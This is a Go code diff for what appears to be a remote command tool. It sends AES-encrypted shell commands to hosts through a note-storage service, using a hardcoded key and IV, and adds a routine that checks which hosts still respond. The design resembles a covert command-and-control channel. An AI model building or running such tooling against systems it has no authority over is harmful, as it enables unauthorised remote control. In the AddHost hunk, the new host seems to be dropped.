@@ -8,7 +8,7 @@ import (
 	"time"
 )
 
-func Hostexec(noteid, notekey string, command string) {
+func Hostexec(noteid, notekey, command string) string {
 
 	key := []byte("qaxzaiciyiyouuuu")
 	iv := []byte("qaxyydsyydsyydss")
@@ -18,7 +18,7 @@ func Hostexec(noteid, notekey string, command string) {
 	base64, err := AesCbcEncryptBase64(sh, key, iv)
 	if err != nil {
 		fmt.Println("加密命令错误")
-		return
+		return ""
 	}
 	WriteNote(noteid, base64)
 
@@ -28,10 +28,9 @@ func Hostexec(noteid, notekey string, command string) {
 	byBase64, err := AesCbcDecryptByBase64(GetNote(noteid), key, iv)
 	if err != nil {
 		fmt.Println("读取结果错误")
-		return
+		return ""
 	}
-	fmt.Println(string(byBase64))
-
+	return string(byBase64)
 }
 
 // 获取主机
@@ -40,10 +39,48 @@ func HostList(admin string) []mode.Host {
 	hosts := []mode.Host{}
 	err := json.Unmarshal([]byte(note), &hosts)
 	if err != nil {
-		fmt.Println("获取主机失败")
 		return nil
 	}
+
 	return hosts
+}
+
+func RefreshHost(admin string) {
+	list := HostList(admin)
+	ii := make(chan int, len(list))
+	for i := range list {
+		go VerifHost(list[i].Id, list[i].Notekey, ii, i)
+	}
+
+	var iiii []int
+	var iii int
+
+	for i := 0; i < len(list); i++ {
+		iii = <-ii
+		if iii != -1 {
+			iiii = append(iiii, iii)
+		}
+	}
+	var hostList []mode.Host
+	for i, _ := range iiii {
+		hostList = append(hostList, list[iiii[i]])
+	}
+	marshal, err := json.Marshal(hostList)
+	if err != nil {
+		return
+	}
+
+	WriteNote(admin, string(marshal))
+
+}
+
+func VerifHost(id string, notekey string, ii chan int, i int) {
+	hostexec := Hostexec(id, notekey, "echo test")
+	if hostexec == "test\n" || hostexec == "test" {
+		ii <- i
+	} else {
+		ii <- -1
+	}
 }
 
 // 添加主机
@@ -55,7 +92,7 @@ func AddHost(admin, notekey, noteid string) {
 	list := HostList(admin)
 	var hosts []mode.Host
 	if list != nil {
-		hosts = append(list, host)
+		hosts = list
 	} else {
 		hosts = []mode.Host{}
 	}
